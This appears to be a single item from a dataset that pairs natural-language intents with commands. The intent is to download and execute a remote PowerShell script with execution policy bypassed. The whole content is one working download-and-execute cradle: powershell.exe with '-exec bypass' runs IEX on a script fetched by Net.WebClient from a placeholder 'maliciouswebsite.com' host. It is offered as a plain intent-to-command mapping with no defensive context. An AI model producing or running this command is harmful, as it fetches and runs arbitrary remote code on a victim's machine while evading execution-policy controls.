# Natural language intent:
# Download and execute a PowerShell script from a remote URL with Bypass execution policy.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/malicious_script.ps1')"
